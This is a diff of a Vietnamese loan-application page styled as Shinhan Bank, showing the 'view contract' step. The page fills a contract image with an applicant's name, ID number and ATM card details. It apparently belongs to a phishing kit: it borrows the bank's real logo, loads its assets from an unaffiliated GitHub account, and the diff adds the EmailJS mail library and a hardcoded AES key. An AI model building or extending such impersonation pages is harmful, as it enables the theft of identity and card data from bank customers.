@@ -5,59 +5,90 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Xem Hợp Đồng - Shinhan Bank</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Arial:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
     <style>
         body {
-            font-family: 'Arial', sans-serif;
+            font-family: 'Roboto', sans-serif;
             font-size: 16px;
             background-color: #f8f9fa;
             margin: 0;
         }
         .header {
-            text-align: center;
-            padding: 20px;
-            background-color: #003087;
-            color: white;
+            padding: 15px;
+            background-color: #ffffff;
+            border-bottom: 1px solid #b3cde0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
         .header img {
-            height: 50px;
+            height: 35px;
         }
-        .header h1 {
-            font-size: 26px;
-            font-weight: 700;
+        .header-icons {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .header-icons i {
+            font-size: 24px;
+            cursor: pointer;
+            color: #0052cc;
         }
         .container {
-            max-width: 800px;
-            margin: 20px auto;
-            padding: 20px;
+            max-width: 90%;
+            width: 100%;
+            margin: 0 auto;
+            padding: 25px;
             background: white;
             border-radius: 8px;
             box-shadow: 0 0 10px rgba(0,0,0,0.1);
             position: relative;
         }
-        .progress-bar-container {
-            margin-bottom: 20px;
+        @media (min-width: 768px) {
+            .container {
+                max-width: 700px;
+                margin: 0 auto;
+            }
         }
-        .progress-bar {
-            height: 20px;
-            background-color: #e9ecef;
-            border-radius: 10px;
-            overflow: hidden;
+        .nav-tabs {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 25px;
+            margin-top: 0;
+            flex-wrap: nowrap;
         }
-        .progress-bar-fill {
-            height: 100%;
-            background-color: #28a745;
-            transition: width 0.3s ease-in-out;
+        .nav-tabs .nav-item {
+            flex: 1;
+            text-align: center;
+        }
+        .nav-tabs .nav-link {
+            background-color: #d3d3d3;
+            color: #ffffff;
+            border-radius: 20px;
+            padding: 8px 16px;
+            font-weight: 500;
+            font-size: 14px;
+            width: 100%;
+            margin: 0 5px;
+        }
+        .nav-tabs .nav-link.active {
+            background-color: #0033a0;
+            color: #ffffff;
         }
         .step-title {
             color: #003087;
             font-size: 18px;
             font-weight: 700;
+            margin-bottom: 20px;
+            text-transform: uppercase;
             text-align: center;
         }
         .step-description {
-            font-size: 16px;
+            font-size: 14px;
             text-align: center;
+            margin-bottom: 20px;
+            color: #1a3c87;
         }
         .image-section {
             text-align: center;
@@ -81,42 +112,53 @@
         .btn-download {
             background-color: #17a2b8;
             color: white;
-            font-size: 16px;
+            font-size: 14px;
             font-weight: 700;
-            padding: 8px 16px;
+            padding: 10px 20px;
+            border-radius: 20px;
             transition: all 0.3s ease;
         }
         .btn-download:hover {
             background-color: #138496;
-            transform: translateY(-2px);
         }
         .btn-primary {
-            font-size: 16px;
-            font-weight: 700;
-            padding: 10px 20px;
-            background-color: #003087;
+            background-color: #0033a0;
             border: none;
-            transition: all 0.3s ease;
+            border-radius: 20px;
+            padding: 10px 20px;
+            font-weight: 700;
+            font-size: 14px;
+            transition: background-color 0.3s ease;
+            margin: 5px;
         }
         .btn-primary:hover {
-            background-color: #00205B;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 10px rgba(0, 32, 91, 0.3);
+            background-color: #0052cc;
         }
-        .btn-secondary {
-            font-size: 16px;
-            font-weight: 700;
-            padding: 10px 20px;
-            background-color: #6c757d;
-            border: none;
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            transition: all 0.3s ease;
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background-color: #003087;
+            color: white;
+            margin-top: 20px;
+            font-size: 12px;
         }
-        .btn-secondary:hover {
-            background-color: #5a6268;
-            transform: translateY(-2px);
+        .footer-links a {
+            color: #b3cde0;
+            margin: 0 10px;
+            text-decoration: none;
+        }
+        .footer-links a:hover {
+            color: #ffffff;
+        }
+        .button-group {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 15px;
+        }
+        .divider-blue {
+            border-top: 1px solid #b3cde0;
+            margin: 15px 0;
         }
         .modal-content {
             border: none;
@@ -135,12 +177,12 @@
             margin-right: 10px;
         }
         .modal-body {
-            text-align: center;
-            padding: 30px;
+            padding: 20px;
         }
         .modal-body p {
-            font-size: 16px;
-            color: #555;
+            font-size: 14px;
+            color: #1a3c87;
+            margin: 5px 0;
         }
         .modal-body p strong {
             font-weight: 700;
@@ -151,37 +193,45 @@
             padding: 20px;
             justify-content: center;
         }
-        .button-group {
+        .action-buttons {
             display: flex;
             justify-content: center;
-            gap: 10px;
+            gap: 15px;
             margin-top: 10px;
-        }
-        .step-transition {
-            transition: opacity 0.5s ease, transform 0.5s ease;
-            opacity: 1;
-            transform: translateX(0);
-        }
-        .step-transition.hidden {
-            opacity: 0;
-            transform: translateX(20px);
-            pointer-events: none;
         }
     </style>
 </head>
 <body>
     <div class="header">
         <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan';">
-        <h1>Đăng Ký Vay Tín Chấp</h1>
-    </div>
-
-    <div class="container">
-        <button type="button" class="btn btn-secondary" onclick="window.location.href='step7.html'">Quay Lại</button>
-        <div class="progress-bar-container">
-            <div class="progress-bar">
-                <div class="progress-bar-fill" id="progressBar" style="width: 80%"></div>
+        <div class="header-icons">
+            <i class="bi bi-search"></i>
+            <div class="dropdown">
+                <i class="bi bi-list" data-bs-toggle="dropdown" aria-expanded="false"></i>
+                <ul class="dropdown-menu dropdown-menu-end">
+                    <li><a class="dropdown-item" href="#">GIỚI THIỆU</a></li>
+                    <li><a class="dropdown-item" href="#">LỢI ÍCH</a></li>
+                    <li><a class="dropdown-item" href="#">GIẤY TỜ CẦN THIẾT</a></li>
+                    <li><a class="dropdown-item" href="#">ĐĂNG KÝ TRỰC TUYẾN</a></li>
+                    <li><a class="dropdown-item" href="#">XEM KẾT QUẢ</a></li>
+                </ul>
             </div>
         </div>
+    </div>
+    <hr class="divider-blue" style="margin: 0;">
+
+    <div class="container">
+        <ul class="nav-tabs">
+            <li class="nav-item">
+                <a class="nav-link" href="#">1. Nhập thông tin</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="#">2. Xác thực và xử lý</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link active" href="#">3. Hoàn thành</a>
+            </li>
+        </ul>
 
         <div id="step8" class="step-transition">
             <h5 class="step-title">Xem Hợp Đồng</h5>
@@ -189,10 +239,17 @@
             <div class="image-section">
                 <canvas id="contractCanvas"></canvas>
             </div>
-            <div class="button-group">
+            <div class="action-buttons">
                 <button id="proceedToStep9Btn" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#confirmContractModal">Ký Hợp Đồng</button>
                 <button id="downloadContractBtn" class="btn btn-download">Tải Hợp Đồng (PDF)</button>
                 <button id="zoomContractBtn" class="btn btn-primary">Phóng To</button>
+            </div>
+
+            <hr class="divider-blue">
+
+            <div class="button-group">
+                <a href="/vaytieudung/shinhanbank/pages/vi/step7.html" class="btn btn-primary">QUAY LẠI</a>
+                <button id="continueToStep9Btn" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#confirmContractModal">TIẾP TỤC</button>
             </div>
         </div>
 
@@ -230,17 +287,29 @@
         </div>
 
         <div class="footer">
-            <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" class="lock-icon" onerror="this.src='https://via.placeholder.com/24x24?text=Lock';">
-            <p>© 2025 Shinhan Bank - Hotline: 1900 1234 - Email: <a href="mailto:support@shinhan.com.vn">support@shinhan.com.vn</a></p>
-            <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo" class="footer-logo" onerror="this.src='https://via.placeholder.com/100x40?text=Logo+Shinhan';">
+            <div class="footer-links">
+                <a href="#">Chính sách bảo mật</a> |
+                <a href="#">Điều khoản sử dụng</a> |
+                <a href="#">Chính sách Cookies</a> |
+                <a href="#">Miễn khoản từ chối liên kết bên ngoài</a> |
+                <a href="#">Hướng dẫn truy cập web</a> |
+                <a href="#">Sitemap</a>
+            </div>
+            <p class="mt-3">Trung tâm bảo mật | Demo Ngân hàng trực tuyến | Liên hệ | Trang Global Portal | Giới Thiệu</p>
+            <p>© 2015 SHINHAN BANK VIETNAM ALL RIGHTS RESERVED.</p>
         </div>
     </div>
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     <script>
-        // Placeholder user data (aligned with Step1)
+        (function() {
+            emailjs.init("OrBsI926QI2_xBh1f");
+        })();
+
         let userData = {
             fullName: "",
             idNumber: "",
@@ -281,45 +350,39 @@
             currentStep: 8
         };
 
-        // Format number to VND
         function formatNumber(number) {
             if (!number) return "Không có";
             return Number(number).toLocaleString('vi-VN');
         }
 
-        // Split date into day, month, year
         function splitDate(dateStr) {
             if (!dateStr) return { day: "Không có", month: "Không có", year: "Không có" };
             const [day, month, year] = dateStr.split("/");
             return { day: day || "Không có", month: month || "Không có", year: year || "Không có" };
         }
 
-        // Save to localStorage
         function saveToLocalStorage() {
             try {
-                localStorage.setItem('userData', JSON.stringify(userData));
-                console.log('Saved userData to localStorage:', userData);
+                const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'shinhan-secret-key').toString();
+                localStorage.setItem('userData', encryptedData);
+                console.log('Saved userData:', userData);
             } catch (error) {
-                console.error('Error saving userData to localStorage:', error);
+                console.error('Error saving userData:', error);
             }
         }
 
-        // Load user data
         function loadUserData() {
             try {
                 const storedData = localStorage.getItem('userData');
                 if (storedData) {
-                    userData = JSON.parse(storedData);
-                    console.log('Loaded userData from localStorage for Step8:', userData);
-                } else {
-                    console.warn('No userData found in localStorage, using default.');
+                    userData = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
+                    console.log('Loaded userData:', userData);
                 }
             } catch (error) {
-                console.error('Error parsing userData from localStorage:', error);
+                console.error('Error parsing userData:', error);
             }
         }
 
-        // Render image and text/ticks on canvas
         function renderCanvas(canvasId, imageUrl, fallbackUrl) {
             const canvas = document.getElementById(canvasId);
             const ctx = canvas.getContext('2d');
@@ -343,8 +406,6 @@
                         ctx.fillRect(field.x - 2, field.y - (rectHeight - 6), ctx.measureText(value).width + 4, rectHeight);
                         ctx.fillStyle = field.color;
                         ctx.fillText(value, field.x, field.y);
-                    } else {
-                        console.warn(`Invalid coordinates for field: ${value} at (${field.x}, ${field.y})`);
                     }
                 });
                 tickFields.forEach(tick => {
@@ -352,11 +413,8 @@
                         ctx.font = tick.font;
                         ctx.fillStyle = tick.color;
                         ctx.fillText(tick.symbol, tick.x, tick.y);
-                    } else {
-                        console.warn(`Invalid coordinates for tick at (${tick.x}, ${tick.y})`);
                     }
                 });
-                console.log('Rendered canvas with fields:', canvasFields.map(f => ({ value: f.value, x: f.x, y: f.y })));
             };
 
             img.onerror = function() {
@@ -380,7 +438,6 @@
             };
         }
 
-        // Define text fields for canvas (removed storeCode at x:2071, y:671)
         const canvasFields = [
             { label: "", value: userData.registrationDate ? splitDate(userData.registrationDate).day : "Không có", x: 539, y: 443, font: "36px Arial bold", color: "#000000" },
             { label: "", value: userData.registrationDate ? splitDate(userData.registrationDate).month : "Không có", x: 710, y: 443, font: "36px Arial bold", color: "#000000" },
@@ -406,7 +463,6 @@
             { label: "", value: userData.atmCard?.cardHolderName || "Không có", x: 683, y: 1080, font: "36px Arial bold", color: "#000000" }
         ];
 
-        // Define tick fields for canvas
         const tickFields = [
             { condition: userData.loanPurpose === "Sửa chữa nhà", x: 183, y: 1157, symbol: "✓", font: "36px Arial bold", color: "#FF0000" },
             { condition: userData.loanPurpose === "Mua xe", x: 511, y: 1161, symbol: "✓", font: "36px Arial bold", color: "#FF0000" },
@@ -421,7 +477,6 @@
             { condition: true, x: 2119, y: 2697, symbol: "✓", font: "36px Arial bold", color: "#FF0000" }
         ];
 
-        // Download canvas as PDF
         function downloadAsPDF(canvas, filename) {
             const { jsPDF } = window.jspdf;
             const pdf = new jsPDF({
@@ -433,7 +488,6 @@
             pdf.save(filename);
         }
 
-        // Load user data and populate fields
         window.onload = function() {
             loadUserData();
             $('#confirmRegistrationDate').text(userData.registrationDate || 'Không có');
@@ -452,8 +506,7 @@
             renderCanvas('contractCanvas', 'https://raw.githubusercontent.com/vaytieudung/shinhanbank/main/assets/img/anhhopdongvay.png', 'https://via.placeholder.com/2480x3508?text=Hinh+Hop+Dong');
         };
 
-        // Populate confirmation modal
-        $('#proceedToStep9Btn').on('click', function() {
+        $('#proceedToStep9Btn, #continueToStep9Btn').on('click', function() {
             $('#confirmRegistrationDate').text(userData.registrationDate || 'Không có');
             $('#confirmFullName').text(userData.fullName || 'Không có');
             $('#confirmIdNumber').text(userData.idNumber || 'Không có');
@@ -469,7 +522,6 @@
             $('#confirmCardHolderName').text(userData.atmCard?.cardHolderName || 'Không có');
         });
 
-        // Zoom contract
         $('#zoomContractBtn').on('click', function() {
             const canvas = document.getElementById('contractCanvas');
             const imgWindow = window.open('');
@@ -483,17 +535,15 @@
             `);
         });
 
-        // Download contract
         $('#downloadContractBtn').on('click', function() {
             const canvas = document.getElementById('contractCanvas');
             downloadAsPDF(canvas, `HopDongVay_${userData.loanCode || 'unknown'}.pdf`);
         });
 
-        // Proceed to Step 9
         function proceedToStep9() {
             userData.currentStep = 9;
             saveToLocalStorage();
-            window.location.href = 'step9.html';
+            window.location.href = '/vaytieudung/shinhanbank/pages/vi/step9.html';
         }
     </script>
 </body>
